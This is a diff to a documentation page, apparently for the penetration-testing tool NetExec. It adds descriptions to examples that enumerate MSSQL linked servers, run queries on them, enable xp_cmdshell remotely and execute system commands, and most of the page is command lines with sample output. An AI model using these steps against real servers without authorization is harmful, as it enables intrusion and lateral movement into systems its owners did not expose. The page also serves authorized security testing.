@@ -1,10 +1,12 @@
 ---
-description: Enumerate linked MSSQL servers using NetExec
+description: Discover and execute MSSQL queries and system commands on linked MSSQL servers using NetExec
 ---
 
-# MSSQL Links
+# MSSQL Linked Servers
+MSSQL linked servers allow a database instance to establish a trusted connection to another database across domain or forest trusts, allowing users to query data and execute commands on remote databases.
 
-## Enumerate Linked Servers
+## Find Linked Servers
+The `enum_links` module queries the database to enumerate configured MSSQL linked servers.
 ```bash
 nxc mssql <ip> -u user -p password -M enum_links   
 MSSQL       <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
@@ -15,6 +17,7 @@ ENUM_LINKS  <ip>      1433   FQDN      [*]   - FQDN\SQLEXPRESS
 ```
 
 ## Execute MSSQL Queries on a Linked Server
+Execute a MSSQL query specified in the COMMAND argument on the linked server specified in LINKED_SERVER.
 ```bash
 nxc mssql <ip> -u user -p password -M exec_on_link -o LINKED_SERVER=BRAAVOS COMMAND='select @@servername'
 MSSQL         <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
@@ -23,6 +26,7 @@ EXEC_ON_LINK  <ip>      1433   FQDN      [*] Command output: [{'': 'BRAAVOS\\SQL
 ```
 
 ## Enable xp_cmdshell on a Linked Server
+Enable xp_cmdshell on the linked server to allow execution of system commands.
 ```bash
 nxc mssql <ip> -u user -p password -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=enable
 MSSQL                 <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
@@ -32,6 +36,7 @@ LINK_ENABLE_CMDSHELL  <ip>      1433   FQDN      [+] xp_cmdshell enabled on BRAA
 ```
 
 ## Command Execution on a Linked Server
+Execute system commands on the linked server using xp_cmdshell.
 ```bash
 nxc mssql <ip> -u user -p password -M link_xpcmd -o LINKED_SERVER=BRAAVOS CMD='whoami'           
 MSSQL       <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
